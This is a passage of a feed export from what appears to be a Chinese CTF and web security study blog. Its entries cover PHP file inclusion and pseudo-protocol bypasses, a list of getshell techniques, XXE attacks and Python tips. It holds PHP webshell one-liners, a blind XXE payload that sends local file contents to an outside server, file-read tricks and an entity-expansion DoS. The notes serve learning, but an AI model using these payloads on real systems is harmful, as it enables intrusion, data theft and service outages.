class="line">另一种方法是在dict.keys()列表中寻找</div><div class="line"></div><div class="line">返回dict中的所有键：</div><div class="line">dict.keys()</div><div class="line"></div><div class="line">返回dict中所有值：</div><div class="line">dict.values()</div><div class="line"></div><div class="line">更新字典，也就是添加没有的键值对，为键对应的值改变的进行更新。类似于加运算吧</div><div class="line">dict.update(dict2)</div></pre></td></tr></table></figure></p><hr><p><strong>使用defaultdict类型来进行遍历的结果记录</strong><br>在对遍历结果统计时经常使用dict类型来记录，但dict在这种情况下有个问题就是，如果是第一次引用一个键，dict[‘xie’] += 1就会出现问题，需要先dict[‘xie’] = 0,再dict[‘xie’] += 1，而defaultdict会在dict[]遇到新的键时为其分配指定的值<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</div><div class="line"></div><div class="line">list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">5</span>]</div><div class="line">dict = defaultdict(int)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</div><div class="line">dict[i]+=<span class="number">1</span></div></pre></td></tr></table></figure></p><hr><p><strong>更加健壮的python程序需要进行参数检查：</strong></p><p>要检查的数据有：</p><ol><li>用户输出的数据</li><li>从文件中解析出来的数据，如从网页中解析出来的数据，从txt中获取的数据</li></ol><p>需要在以下几个地方做参数检查：</p><ol><li>最初遇到这种参数时就做出了检查</li><li>必须保证安全性关键的子函数，如果def download(url)</li><li>检测函数中，经常会做切片分析检测，要防止越界</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用python已经有很长一段时间了，在比赛中python语言的简洁易懂性给了我很大的帮助。当对一项技能使用的熟练度到达一定程度的时候，就该重新入门了。本文章将长期保持更新，收集记录各种python黑魔法，努力使自己的代码变得更加pythonic！&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP文件包含，文件读取的利用思路，以及配合伪协议的trick</title>
    <link href="https://someonesometimes.github.io/2017/05/11/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%EF%BC%8C%E4%BB%A5%E5%8F%8A%E9%85%8D%E5%90%88%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84trick/"/>
    <id>https://someonesometimes.github.io/2017/05/11/PHP文件包含，文件读取的利用思路，以及配合伪协议的trick/</id>
    <published>2017-05-11T13:54:08.000Z</published>
    <updated>2017-10-23T09:21:49.924Z</updated>
    
    <content type="html"><![CDATA[<p><strong>PHP的文件包含函数有两类，分三种：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">file_get_contents() </div><div class="line"><span class="keyword">include</span>()/<span class="keyword">include_once</span>()  <span class="keyword">require</span>/<span class="keyword">require_once</span>()</div></pre></td></tr></table></figure></p><p>第一种用于获取文件的数据，第二种用于包含并执行代码与读取文件两种功能</p><p><strong>php写文件的函数</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_put_contents()</div></pre></td></tr></table></figure><p>基本的思路就是用来写shell吧，不过会有各种限制，但是结合伪协议就可以简单绕过了</p><a id="more"></a><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>这个函数经常用于获取文件内容，尤其是php文件的代码，配合伪协议中的元封装器php://filter/convert.base64-encode/resource=class.php<br>几乎已经成了公认的文件获取姿势</p><h3 id="include-require"><a href="#include-require" class="headerlink" title="include() / require()"></a>include() / require()</h3><p><strong>首先说下两者的唯一不同</strong></p><ol><li>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行</li><li>require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li></ol><p><strong>此函数利用的原理</strong><br>把参数作为一个php文件去运行，所以基本使用方法有拿运行环境与拿输出代码两种作用</p><p><strong>这种文件包含利用的目的无外乎以下几种：</strong></p><ul><li>使用php://filter/convert.base64-encode/resource=xxx来读文件源码</li><li>包含shell代码文件（自己上传的，写的等各种方式），使代码具有php的执行环境</li><li>包含使用伪协议自定的数据流，常用于写shell</li><li>包含关键文件，获得该文件的输出结果与执行环境（就比如说关键文件中的变量引入）</li></ul><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h3><p>用来写文件进去，其中文件名参数是支持伪协议的，用于将第二个参数content进行过滤器后再写进文件里面去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_put_contents($_POST[<span class="string">'filename'</span>], <span class="string">"&lt;?php system($_GET['c']);?&gt;"</span>);</div></pre></td></tr></table></figure><h3 id="以上函数有许多种利用姿势，结合伪协议又可以实现各种检测的绕过，在这里做出统计"><a href="#以上函数有许多种利用姿势，结合伪协议又可以实现各种检测的绕过，在这里做出统计" class="headerlink" title="以上函数有许多种利用姿势，结合伪协议又可以实现各种检测的绕过，在这里做出统计"></a>以上函数有许多种利用姿势，结合伪协议又可以实现各种检测的绕过，在这里做出统计</h3><p>1、<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$content = <span class="string">'&lt;?php exit; ?&gt;'</span>;</div><div class="line">$content .= $_POST[<span class="string">'txt'</span>];</div><div class="line">file_put_contents($_POST[<span class="string">'filename'</span>], $content);</div></pre></td></tr></table></figure></p><p>写文件的时候在之前加上了exit函数，可以使用伪协议的base64，rot13，strip_tags来处理下</p><p>2、包含form-data形式下php创建的临时文件</p><p>3、文件包含函数的参数有固定的后缀<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$file = $_GET[&apos;file&apos;].&apos;.php&apos;;</div><div class="line">include($file);</div></pre></td></tr></table></figure></p><p>考虑使用phar://或zip://伪协议来绕过</p><p>4、压缩文件上传后再解压文件读取，可以考虑软连接的形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ln -s /etc/passwd 1.txt</div><div class="line">tar -czvf test.tar.gz 1.txt</div></pre></td></tr></table></figure></p><p>5、使用伪协议php://  data:// 构造输入流</p><p>6、包含session文件<br>session文件一般在/tmp目录下，格式为sess_[phpsessid]</p><p>7、文件包含函数参数有其他样式的后缀，</p><pre><code>%00截断/etc/passwd%00(需要 magic_quotes_gpc=off，PHP小于5.3.4有效) 路径长度截断：/etc/passwd/././././././.[…]/./././././.(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)点号截断：/boot.ini/………[…]…………(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</code></pre><p>8、远程文件包含shell，这个在5.6下测试过了，php代码可以正常执行，但是不知为什么马运行不了，莫非是权限问题？？？好像记得ph师傅说过远程文件包含默认是禁用的。<br>9、包含日志文件</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;PHP的文件包含函数有两类，分三种：&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;file_get_contents() &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;()/&lt;span class=&quot;keyword&quot;&gt;include_once&lt;/span&gt;()  &lt;span class=&quot;keyword&quot;&gt;require&lt;/span&gt;/&lt;span class=&quot;keyword&quot;&gt;require_once&lt;/span&gt;()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;第一种用于获取文件的数据，第二种用于包含并执行代码与读取文件两种功能&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;php写文件的函数&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;file_put_contents()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;基本的思路就是用来写shell吧，不过会有各种限制，但是结合伪协议就可以简单绕过了&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP伪协议</title>
    <link href="https://someonesometimes.github.io/2017/05/11/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>https://someonesometimes.github.io/2017/05/11/PHP伪协议/</id>
    <published>2017-05-11T13:53:23.000Z</published>
    <updated>2017-10-25T09:36:04.489Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>伪协议，个人感觉就像是对数据流的一种处理方式合集，所有以数据流作为参数的函数都应该考虑是否能够使用伪协议</p><p>现在基本就能确定，有文件包含的地方，就特别应当考虑伪协议的各种妙用</p><p>关于伪协议中的过滤器真的是要赞下，如果可以使用过滤器的话，代码检测几乎是没有任何用处的，我们可以使用过滤器进行各种各样的字符串处理，鬼知道有多少种姿势。。。</p></blockquote><a id="more"></a><p><strong>伪协议可以分为以下几类：</strong></p><ul><li>生成数据流 （上面两种在wamp 5.6php版本中都被禁用了）<ul><li>php://input</li><li>data://text/plain;base64,base64编码字符串</li></ul></li><li>数据流过滤器（测试可以看到在5.6版本的php中还没有被禁用）<ul><li>php://filter/convert.base64-encode/resource=xxx</li><li>php://filter/convert.base64-decode/resource=xxx</li><li>phar://</li><li>zip://</li></ul></li><li>远程文件访问<ul><li>http://</li><li>ftp://</li></ul></li><li>本地文件访问<ul><li>file:///</li></ul></li></ul><p>现在将逐一介绍这些伪协议以及其常用的应用场景</p><hr><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>很常用的数据流构造器，将读取提交的数据作为数据流的输入，也就是post的部分</p><h3 id="data-text-plain-base64-base编码字符串"><a href="#data-text-plain-base64-base编码字符串" class="headerlink" title="data://text/plain;base64,base编码字符串"></a>data://text/plain;base64,base编码字符串</h3><p>很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入</p><h3 id="php-filter-convert-base64-encode-decode-resource-xxx"><a href="#php-filter-convert-base64-encode-decode-resource-xxx" class="headerlink" title="php://filter/convert.base64-[encode/decode]/resource=xxx"></a>php://filter/convert.base64-[encode/decode]/resource=xxx</h3><p>base64本来就有不少小trick，结合文件包含更是会有各种妙用，看下面这些:</p><ul><li><p>在引入resource所指的资源时，通过过滤器进行base64进行编码或解码通常用于获取文件数据时，将文件进行编码后传输</p></li><li><p>Ph师傅的文章中介绍到了这样一种很巧妙的场景，文件包含参数可控制，可上传内容为固定8种字符，于是首先使用可控制的文件包含结合php://filter读到源码，上传文件因为只能包含8种字符，可以使用base64的小trick经过n次编码将shell转换成只有8种字符的要求，然后文件包含shell中利用多次过滤器嵌套来实现多次base64解码，最终解析到shell</p><p><code>php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=.....</code></p></li></ul><h3 id="php-filter-read-write-string-rot13-strip-tags-…-resource-xxx"><a href="#php-filter-read-write-string-rot13-strip-tags-…-resource-xxx" class="headerlink" title="php://filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx"></a>php://filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx</h3><p>过滤器里还支持用一些字符串处理函数进行过滤，这样选择的范围就更多了，但目前也就从p牛的博客里看到有这两个函数，其他的没有找到，strip_tags可以用来去掉字符串中的标签</p><p>注意这个过滤器是要分清read与write两个情景的，用错的话就不会产生相应的效果。在file_put_contents()中就要使用write才有过滤效果，在include(),file_get_contents()中就要使用read才有效</p><h3 id="phar-archive-zip-jpg-png…-file-txt"><a href="#phar-archive-zip-jpg-png…-file-txt" class="headerlink" title="phar://archive.[zip/jpg/png…]/file.txt"></a>phar://archive.[zip/jpg/png…]/file.txt</h3><p>经测试，其实可以将任意后缀名的文件(必须要有后缀名)，只要是zip格式压缩的，都可以进行解压，因此上面可以改为phar://archive.abc/file.txt也可以运行</p><p>phar简直就是文件上传+文件包含场景中的神器：</p><p>如果文件上传后可以利用文件包含实现代码执行的话，文件上传中的后缀名过滤基本上一点用都没有了，我们其实可以上传任意后缀名的压缩文件，压缩文件里面包含着我们的任意文件，然后在文件包含的时候使用phar伪协议将我们的文件从压缩包里面提取出来</p><h3 id="zip-archive-zip-file-txt"><a href="#zip-archive-zip-file-txt" class="headerlink" title="zip://archive.zip#file.txt"></a>zip://archive.zip#file.txt</h3><p>用处和phar是一样的，应用场景也一样，但是要注意<strong> ‘#’ </strong>书写的时候要编码为%23才行，因为url的#后面是默认不传输的</p><p>还有测试上，不知为什么，同样是5.6版本，在kali虚拟机上测试通过了，但在windows下就没有通过，也许是配置的问题</p><p>### </p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;伪协议，个人感觉就像是对数据流的一种处理方式合集，所有以数据流作为参数的函数都应该考虑是否能够使用伪协议&lt;/p&gt;
&lt;p&gt;现在基本就能确定，有文件包含的地方，就特别应当考虑伪协议的各种妙用&lt;/p&gt;
&lt;p&gt;关于伪协议中的过滤器真的是要赞下，如果可以使用过滤器的话，代码检测几乎是没有任何用处的，我们可以使用过滤器进行各种各样的字符串处理，鬼知道有多少种姿势。。。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF中getshell的统计</title>
    <link href="https://someonesometimes.github.io/2017/05/11/CTF%E4%B8%ADgetshell%E7%9A%84%E7%BB%9F%E8%AE%A1/"/>
    <id>https://someonesometimes.github.io/2017/05/11/CTF中getshell的统计/</id>
    <published>2017-05-11T12:42:41.000Z</published>
    <updated>2017-07-20T08:32:50.274Z</updated>
    
    <content type="html"><![CDATA[<p><strong>CTF题目中有不少题目的最终结果就是getshell，从现在开始对所遇到的情况进行统计，积累的多了，也许就能慢慢摸出套路了吧</strong></p><a id="more"></a><p>1、在BCTF中的paint题目里面，从一个指定url的文件上传，考虑是使用命令行的方式，通过包含xss来看其http头的访问形式，判定使用的curl命令，因此考虑是命令注入的漏洞，成功进行命令注入后即getshell</p><p>2、exec(“/bin/hence “ . $shell);php中直接有了这样的函数，但是命令执行因有前缀遇到问题，通过%0a进行命令注入（因为其他的符号都被过滤了<code>preg_match(&#39;/^\w+$/&#39;, $shell[$i])</code>），<br>之后使用tar打包文件之后下载或使用wget一个新的马的方式</p><p>3、有个就给出了eval()函数，但是限制命令长度，基本无法使用命令远程getshell，考虑echo ‘’&gt; xx的形式来直接写一个shell，最终考虑的方案是使用echo ls &gt; xx来靠文件名来写shell</p><p>4、leavesong中也是一个限制命令长度的题目，使用的方法是：</p><p>5、在HBCTF里面的一个web题目，盲注得到shell重命名后的名字，然后因为是以文件包含的形式getshell,可以使用部分伪协议，所以在文件上传的时候就容易了很多，直接使用phar://的思路就可以</p><p>6、有一题目通过上传.htaccess文件来为文本配置执行环境为php</p><p>7、有一题存在文件包含功能，通过递归的文件包含（包含自己）是程序崩溃，留下文件上传的临时文件，之后通过一个第三方程序的目录遍历漏洞来获取临时文件名，调用后getshell<br>这里再补充下所见过的程序崩溃的写法，一般都是通过递归调用的方式来构成溢出吧：</p><ul><li>文件包含中包含自己</li><li>xxe中仿照实体递归定义的方式书写，最后调用此实体引起溢出</li></ul><p>8、文件上传中上传了改后缀为图片格式的文件，之后被php文件引用了，然后里面的代码就有了php的执行环境，即所谓’图马’</p><p>9、通过日志写shell，之后文件包含日志，文件包含C:\wamp\logs\access.log即可以执行shell 目前所见的日志写shell都是通过tencent来实现的</p><p>10、<code>select &quot;&lt;?php system($_GET[&#39;c&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/uploads/xie.php&#39;</code>来通过将数据写入指定的文件来写入shell</p><h2 id="基于以上的统计，做出归纳整理"><a href="#基于以上的统计，做出归纳整理" class="headerlink" title="基于以上的统计，做出归纳整理"></a>基于以上的统计，做出归纳整理</h2><h3 id="通过php代码的："><a href="#通过php代码的：" class="headerlink" title="通过php代码的："></a>通过php代码的：</h3><p><strong>shell上传</strong></p><ul><li>通过正常的文件上传流程</li><li>通过php异常中断后的临时文件</li><li>通过写日志的方法，将log文件作为shell</li><li></li></ul><p><strong>shell调用</strong></p><ul><li>使用文件包含获得php的执行环境，见<a href=""></a>的总结</li><li>使用url直接访问具有调用php解释器的文件,像PhP可以直接使用.php调用</li><li>在调用时通过修改.htaccess文件获得php的执行环境，改变url调用文件的解释器</li><li><strong>文件目录与名字的获取上</strong><ul><li>知道文件的位置与名字，直接进行url访问</li><li>由一些第三方软件的漏洞 如kindeditor 的目录遍历获得信息</li><li>由暴力破解的脚本方式，一般适用于已知位置的情况</li><li>由phpinfo()可以知道form-data+文件中断的临时文件的保存位置（5.6未测试成功）</li><li>有个数据库的环境下，文件更改后的名字可能能通过数据库注入来获取</li><li>包含的是日志文件等的话，有固定的位置，<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">常见的有，最准确的应该通过phpinfo()来看</div><div class="line">/var/log/apache/access_log</div><div class="line">/var/www/logs/access_log</div><div class="line">/var/log/access_log</div></pre></td></tr></table></figure></li></ul></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>命令注入，php审计中发现的显示命令调用以及黑盒测试中发现的命令调用</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;CTF题目中有不少题目的最终结果就是getshell，从现在开始对所遇到的情况进行统计，积累的多了，也许就能慢慢摸出套路了吧&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XXE学习笔记</title>
    <link href="https://someonesometimes.github.io/2017/05/07/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://someonesometimes.github.io/2017/05/07/XXE学习笔记/</id>
    <published>2017-05-07T07:23:28.000Z</published>
    <updated>2017-11-02T10:54:55.406Z</updated>
    
    <content type="html"><![CDATA[<ul><li>XXE攻击的场景以及用途</li><li>XXE产生的原因</li><li>（基础学习）XML文档类型定义部分————dtd的说明</li><li>基于回显的XXE攻击</li><li>无回显的Blind XXE攻击</li><li>基于XXE的其他攻击</li><li>参考文章</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="external">https://thief.one/2017/06/20/1/</a></p><p><a href="http://www.freebuf.com/articles/web/97833.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/97833.html</a></p><h2 id="XXE攻击的场景以及用途"><a href="#XXE攻击的场景以及用途" class="headerlink" title="XXE攻击的场景以及用途"></a>XXE攻击的场景以及用途</h2><p>在一切对XML文件进行解析的场景中，都有可能出现XXE注入。像XML文件作为配置文件（spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）,soap通信通信格式，甚至有道题目的参数为<user><name>Yiruma</name></user>处理中也涉及到了对xml文件的解析，此外，网上有一些在线XML格式化工具，还有一ctf题目中的将csv文件转化为xml文件的功能，都可能涉及到不安全的XML文件解析从而存在攻击点<br>说到XXE攻击的常见用途有：实现文件包含，重复定义引用（仿递归）的DDOS攻击，外部文件引用，内网探测，待补充。。。。</p><h2 id="XXE产生的原因"><a href="#XXE产生的原因" class="headerlink" title="XXE产生的原因"></a>XXE产生的原因</h2><p>在有对XML文件进行解析的地方，如果使用了不安全的XML解析函数如php的simplexml_load_string()，对外部实体进行了解析下，就有可能引入不安全的参数，从而造成攻击。</p><h2 id="（基础学习）XML文档类型定义部分————dtd的说明"><a href="#（基础学习）XML文档类型定义部分————dtd的说明" class="headerlink" title="（基础学习）XML文档类型定义部分————dtd的说明"></a>（基础学习）XML文档类型定义部分————dtd的说明</h2><p>首先给出一坨dtd以表明其结构<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE ANY[  </span></div><div class="line">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;  </div><div class="line">&lt;!ENTITY % evil SYSTEM "http://127.0.0.1/evil.dtd"&gt;  </div><div class="line">&lt;!ENTITY xie "xie"&gt;</div><div class="line">%remote;  </div><div class="line">%send;  </div><div class="line">]&gt;</div></pre></td></tr></table></figure></p><p><strong>在dtd里面可以通过&lt;!ENTITY [SYSTEM] xxxx&gt;定义两种参数———参数实体与一般实体。</strong></p><p><strong>参数实体</strong>格式为&lt;!ENTITY % name [SYSTEM] “”&gt;但是参数实体只能在dtd中使用，并且不能在实体定义中使用，引用后也不会产生回显，种种限制下我们看到参数实体最常见的作用其实就是在dtd中定义后再引用，起到使用SYSTEM下通过协议引入资源的作用，类似于php中的require  如：<code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>  <code>&lt;!ENTITY % all SYSTEM &quot;http://118.89.16.36/evil.dtd&quot;&gt;</code> 然后再 %all; %file;</p><p><strong>一般实体</strong>格式为&lt;!ENTITY name [SYSTEM] “”&gt;一般实体可以在实体定义中使用如<code>&lt;!ENTITY xie SYSTEM &quot;xie,&amp;fei;&quot;&gt;</code> 可以在XML文档中使用如<xxe>&amp;file</xxe>,一般在dtd文档外部引用来回显数据</p><p><strong>内部实体</strong><br>也就是在定义实体时的嵌套定义  <code>&lt;!ENTITY % param1 &quot;&lt;!ENTITY internal &#39;http://www.baidu.com&#39;&gt;&quot;&gt;  %param1;</code>在Blind XXE中会用到，但是其是否能够解析也是不一定的</p><p><strong>如果使用SYSTEM的话，就可以使用各种协议或是伪协议，在存在漏洞的xml解析函数中就会解析外部实体，据Ben师傅笔记来说，php5.5.12和5.6以上都不会自动解析，php5.4.4可以</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">file:///path/to/file.ext   本地文件</div><div class="line">http://118.89.16.36/xss/?file=xx  文件包含</div><div class="line">http://10.5.68.243  内网探测</div><div class="line">php://filter/read=convert.base64-encode/resource=conf.php  文件包含</div></pre></td></tr></table></figure></p><h2 id="基于回显的XXE攻击"><a href="#基于回显的XXE攻击" class="headerlink" title="基于回显的XXE攻击"></a>基于回显的XXE攻击</h2><p>如果存在回显的话，就可以在dtd文档外部引用一般实体来得到数据 如在dtd中定义<code>&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>  在外部引用<code>&lt;x&gt;&amp;file;&lt;/x&gt;</code></p><h2 id="无回显的Blind-XXE攻击"><a href="#无回显的Blind-XXE攻击" class="headerlink" title="无回显的Blind XXE攻击"></a>无回显的Blind XXE攻击</h2><p><strong>注：已经更新了payload，并在题目中尝试成功。xxe没有接收到的原因并不是payload有问题，而是要获取的文件不存在！！！</strong></p><p>如果不存在回显的话，就可以使用dtd文档内<code>&lt;!ENTITY file SYSTEM &quot;http://118.89.16.36/xss/?data=xxx&quot;&gt;</code>协议的特性，来携带关键数据访问vps后拿到，构造blind xxe是需要好好考虑下的<br>由于参数实体无法在定义中使用，形如<code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>  <code>&lt;!ENTITY file SYSTEM &quot;http://118.89.16.36/xss/?data=%file&quot;&gt;</code>就无法使用了，因此我们考虑这样一种构建方式：<br>首先在vps中建立evil.dtd<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all</div><div class="line">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://118.89.16.36/x/?%file;'&gt;"</div><div class="line">&gt;</div><div class="line">%all;</div></pre></td></tr></table></figure></p><p>然后xml中书写如下形式<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE ANY [ </span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://118.89.16.36/x/myjs/evil.dtd"&gt;</div><div class="line">%dtd;</div><div class="line">%send;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p><p>执行的逻辑结构大概就是这样：<br><img src="http://i.imgur.com/CGNfRmF.png" alt=""><br>作图时忘了加上了，服务器中放置的DTD文件是%all包含的一个文本，文本中的%使用了HTML编码，因为做为特殊字符，如果不进行编码的话，在定义%all中就会出现问题</p><h2 id="基于XXE的其他攻击"><a href="#基于XXE的其他攻击" class="headerlink" title="基于XXE的其他攻击"></a>基于XXE的其他攻击</h2><p><strong>拒绝服务攻击(DDoS)</strong><br>测试后可以看到形如<code>&lt;!ENTITY xxe &quot;&amp;xie;&quot;&gt;</code>递归定义无法实现,但可以手动实现下<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY a0 "dos" &gt;</div><div class="line">&lt;!ENTITY a1 "&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"&gt;</div><div class="line">&lt;!ENTITY a2 "&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"&gt;</div><div class="line">&lt;!ENTITY a3 "&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;"&gt;</div><div class="line">&lt;!ENTITY a4 "&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;a4;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure></p><p>这个文件只有 30 Kb大小但却有 11111 个实体引用，超出了合法的实体引用数量上限。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">腾讯安全应急响应中心：未知攻焉知防——XXE漏洞攻防</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">Exploit的小站~：XXE漏洞以及Blind XXE总结</a><br><a href="http://www.freebuf.com/articles/web/97833.html" target="_blank" rel="external">FreeBuf：DTD/XXE 攻击笔记分享</a><br><a href="http://www.jinglingshu.org/?p=7830" target="_blank" rel="external">精灵鼠：XXE注入攻击与防御</a></p>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;XXE攻击的场景以及用途&lt;/li&gt;
&lt;li&gt;XXE产生的原因&lt;/li&gt;
&lt;li&gt;（基础学习）XML文档类型定义部分————dtd的说明&lt;/li&gt;
&lt;li&gt;基于回显的XXE攻击&lt;/li&gt;
&lt;li&gt;无回显的Blind XXE攻击&lt;/li&gt;
&lt;li&gt;基于XXE的其他攻击&lt;/li&gt;
&lt;li&gt;参考文章&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="https://someonesometimes.github.io/2017/05/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>https://someonesometimes.github.io/2017/05/02/文件上传漏洞/</id>
    <published>2017-05-02T12:03:26.000Z</published>
    <updated>2017-10-25T11:29:05.012Z</updated>
    
